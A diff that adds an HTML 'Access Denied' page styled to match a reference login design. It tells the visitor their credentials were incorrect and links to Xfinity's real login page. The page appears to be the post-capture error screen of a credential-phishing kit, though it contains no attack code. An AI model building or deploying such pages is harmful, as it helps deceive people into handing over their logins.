@@ -1,0 +1,111 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Invalid Details</title>
+    <style>
+        /* General Reset and Body Styling */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; /* A common, clean sans-serif font stack */
+            /* Subtle gradient background inspired by the image's right panel, kept light */
+            background: linear-gradient(135deg, #f5f7fa 0%, #e8ebf0 100%);
+            color: #333333; /* Default dark text color */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        /* Error Content Container */
+        .error-container {
+            background-color: #ffffff; /* White background for the content card */
+            padding: 40px 45px; /* Increased padding for a more spacious feel */
+            border-radius: 0px; /* Sharp corners as seen on the form */
+            /* Removed box-shadow for a flatter design, closer to the reference image's form area */
+            text-align: center;
+            max-width: 480px; /* Slightly adjusted max width */
+            width: 100%;
+            border: 1px solid #d9dce1; /* Very light border, similar to input field containers */
+        }
+
+        /* Heading Styling */
+        .error-container h1 {
+            font-size: 26px; /* Prominent heading size */
+            color: #1c1c1c; /* Darker color for heading */
+            margin-bottom: 18px;
+            font-weight: 500; /* Medium weight, often used in modern UI */
+        }
+
+        /* Paragraph Styling */
+        .error-container p {
+            font-size: 15px;
+            color: #4a4a4a; /* Softer gray for descriptive text */
+            line-height: 1.65;
+            margin-bottom: 35px;
+        }
+
+        /* Button Styling */
+        .retry-button {
+            display: inline-block;
+            /* Gradient for the button to give it slight depth, matching 'Let's go' feel */
+            background: linear-gradient(to bottom, #6a2fae 0%, #572791 100%);
+            color: #ffffff; /* White text color */
+            padding: 15px 30px; /* Generous padding */
+            font-size: 16px;
+            font-weight: 600; /* Bold text */
+            text-decoration: none;
+            border-radius: 5px; /* Slightly more pronounced rounded corners for the button */
+            border: none; /* No border for a cleaner look */
+            cursor: pointer;
+            transition: background 0.2s ease-in-out;
+            text-align: center;
+            width: 100%; /* Make button full width */
+            box-shadow: 0 1px 3px rgba(0,0,0,0.08); /* Very subtle shadow for the button itself */
+        }
+
+        .retry-button:hover,
+        .retry-button:focus {
+            /* Darken the gradient on hover/focus */
+            background: linear-gradient(to bottom, #572791 0%, #482073 100%);
+            outline: none;
+        }
+
+        /* Responsive Adjustments */
+        @media (max-width: 600px) {
+            .error-container {
+                padding: 30px 25px;
+                margin: 15px; /* Add some margin on small screens */
+            }
+
+            .error-container h1 {
+                font-size: 22px;
+            }
+
+            .error-container p {
+                font-size: 14px;
+                margin-bottom: 25px;
+            }
+
+            .retry-button {
+                padding: 14px 25px;
+                font-size: 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="error-container">
+        <h1>Access Denied</h1> <p>The credentials you provided were incorrect, or your access has been restricted. Please verify your details and try again.</p>
+        <a href="https://login.xfinity.com/login" class="retry-button">Try Again</a>
+    </div>
+</body>
+</html>
